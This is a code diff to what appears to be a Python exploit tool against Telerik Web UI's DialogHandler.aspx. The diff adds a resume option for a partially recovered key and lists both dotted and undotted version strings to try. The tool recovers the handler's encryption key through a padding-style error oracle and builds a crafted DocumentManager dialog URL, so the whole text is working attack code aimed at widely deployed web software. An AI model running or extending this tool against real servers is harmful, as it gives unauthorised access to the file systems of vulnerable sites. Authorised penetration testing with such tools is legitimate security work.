@@ -119,10 +119,11 @@ def test_keypos(key_charset, unprintable, found, session):
     return False
 
 
-def get_key(session):
+def get_key(session, found):
     global char_requests
-    found = args.found
+
     unprintable = False
+    keychar = True
 
     key_length = args.key_len
     key_charset = args.charset
@@ -154,7 +155,7 @@ def get_key(session):
         ) +
         "]\n"
     )
-    for i in range(len(found),int(key_length)):
+    for i in range(len(found), int(key_length)):
         pos_str = (
             str(i + 1)
             if i > 8
@@ -185,20 +186,14 @@ def get_key(session):
             sys.stdout.flush()
             break
     if keychar is not False:
-        print("Found key: " +
-              (
-                found
-                if unprintable is False
-                else "(hex) " + binascii.hexlify(found.encode()).decode()
-              )
-              )
+        print("Found key: (hex) " + binascii.hexlify(found.encode()).decode())
     print("Total web requests: " + str(requests_sent))
     return found
 
 
 def mode_brutekey():
     session = requests.Session()
-    found = get_key(session)
+    found = get_key(session, binascii.unhexlify(args.resume_key.encode()).decode())
 
     if found == '':
         return
@@ -215,17 +210,17 @@ def mode_brutekey():
                     '&dp='
                   )
         versions = [
-                    '2007.1423', '2007.1521', '2007.1626', '2007.2918',
-                    '2007.21010', '2007.21107', '2007.31218', '2007.31314',
-                    '2007.31425', '2008.1415', '2008.1515', '2008.1619',
-                    '2008.2723', '2008.2826', '2008.21001', '2008.31105',
-                    '2008.31125', '2008.31314', '2009.1311', '2009.1402',
-                    '2009.1527', '2009.2701', '2009.2826', '2009.31103',
-                    '2009.31208', '2009.31314', '2010.1309', '2010.1415',
-                    '2010.1519', '2010.2713', '2010.2826', '2010.2929',
-                    '2010.31109', '2010.31215', '2010.31317', '2011.1315',
-                    '2011.1413', '2011.1519', '2011.2712', '2011.2915',
-                    '2011.31115', '2011.3.1305', '2012.1.215', '2012.1.411',
+                    '2007.1.423', '2007.1.521', '2007.1.626', '2007.2.918',
+                    '2007.2.1010', '2007.2.1107', '2007.3.1218', '2007.3.1314',
+                    '2007.3.1425', '2008.1.415', '2008.1.515', '2008.1.619',
+                    '2008.2.723', '2008.2.826', '2008.2.1001', '2008.3.1105',
+                    '2008.3.1125', '2008.3.1314', '2009.1.311', '2009.1.402',
+                    '2009.1.527', '2009.2.701', '2009.2.826', '2009.3.1103',
+                    '2009.3.1208', '2009.3.1314', '2010.1.309', '2010.1.415',
+                    '2010.1.519', '2010.2.713', '2010.2.826', '2010.2.929',
+                    '2010.3.1109', '2010.3.1215', '2010.3.1317', '2011.1.315',
+                    '2011.1.413', '2011.1.519', '2011.2.712', '2011.2.915',
+                    '2011.3.1115', '2011.3.1305', '2012.1.215', '2012.1.411',
                     '2012.2.607', '2012.2.724', '2012.2.912', '2012.3.1016',
                     '2012.3.1205', '2012.3.1308', '2013.1.220', '2013.1.403',
                     '2013.1.417', '2013.2.611', '2013.2.717', '2013.3.1015',
@@ -238,6 +233,10 @@ def mode_brutekey():
                     '2017.1.228', '2017.2.503', '2017.2.621', '2017.2.711',
                     '2017.3.913'
                     ]
+        undotted_versions = []
+        for version in versions:
+            undotted_versions.append(re.sub(r'\.(?=\d+$)', '', version))
+        versions += undotted_versions
 
         plaintext1 = 'EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,'
         plaintext2_raw1 = 'Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version='
@@ -334,14 +333,15 @@ encrypt_parser.add_argument('key', action='store', type=str, default='', help='K
 
 brute_parser = subparsers.add_parser('k', help='Bruteforce key/generate URL')
 brute_parser.set_defaults(func=mode_brutekey)
-brute_parser.add_argument('-u', '--url', action='store', type=str, help='Target URL')
+brute_parser.add_argument('-u', '--url', action='store', type=str, help='Target URL, e.g. https://???.???.???/Telerik.Web.UI.DialogHandler.aspx')
 brute_parser.add_argument('-l', '--key-len', action='store', type=int, default=48, help='Len of the key to retrieve, OPTIONAL: default is 48')
 brute_parser.add_argument('-o', '--oracle', action='store', type=str, default='Index was outside the bounds of the array.', help='The oracle text to use. OPTIONAL: default value is for english version, other languages may have other error message')
 brute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='OPTIONAL. Specify the version to use rather than iterating over all of them')
 brute_parser.add_argument('-c', '--charset', action='store', type=str, default='hex', help='Charset used by the key, can use all, hex, printable, or user defined. OPTIONAL: default is hex')
 brute_parser.add_argument('-a', '--accuracy', action='store', type=int, default=9, help='Maximum accuracy is out of 64 where 64 is the most accurate, \
     accuracy of 9 will usually suffice for a hex, but 21 or more might be needed when testing all ascii characters. Increase the accuracy argument if no valid version is found. OPTIONAL: default is 9.')
-brute_parser.add_argument('-f', '--found', action='store', type=str, default='', help='Resume bruteforcing from a checkpoint. OPTIONAL')
+# Credits to @alphaskade for key resume feature
+brute_parser.add_argument('-r', '--resume-key', action='store', type=str, default='', help='Specify a partial key to resume testing, or complete key to get the URL.')
 brute_parser.add_argument('-p', '--proxy', action='store', type=str, default='', help='Specify OPTIONAL proxy server, e.g. 127.0.0.1:8080')
 
 encode_parser = subparsers.add_parser('b', help='Encode parameter to base64')
